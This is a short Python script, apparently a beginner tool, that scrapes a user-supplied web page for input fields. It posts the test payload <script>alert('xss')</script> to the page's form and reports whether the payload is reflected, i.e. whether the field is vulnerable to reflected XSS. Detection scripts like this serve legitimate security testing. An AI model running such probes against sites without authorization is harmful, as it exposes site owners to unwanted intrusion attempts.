import requests
from bs4 import BeautifulSoup
import time
from urllib.parse import urljoin

session = requests.Session()
url = input('Which URL to scan? (example: https://example.com/):')
response = requests.get(url)
web_status = response.status_code

if web_status == 200:
    print("Website is up! Now searching for input fields...")
elif web_status == 400:
    print("You may have misspelled something, or there's a different error.")
elif web_status == 403:
    print("403 Forbidden")
elif web_status == 404:
    print("Check for misspelling or if the host is down.")

suppe = BeautifulSoup(response.text, 'html.parser')
input_felder = suppe.find_all('input')

time.sleep(3)
if input_felder:
    print("Input fields found:")
    for field in input_felder:
        print(f" - {field.get('name', 'Unnamed field')}")
    inputfeld = input('Choose an input field (name=ExampleInput):')

    form = suppe.find('form')
    if form:
        action_url = form.get('action')
        if not action_url:
            action_url = url
        else:
            action_url = urljoin(url, action_url)

        print(f"Form action URL: {action_url}")

        payload = {inputfeld: "<script>alert('xss')</script>"}
        form_response = session.post(action_url, data=payload)

        if "<script>alert('xss')</script>" in form_response.text:
            print("This input field is vulnerable to XSS!")
        else:
            print("This input field is not vulnerable to XSS.")
    else:
        print("No form found on the page.")
else:
    print("No input fields found.")
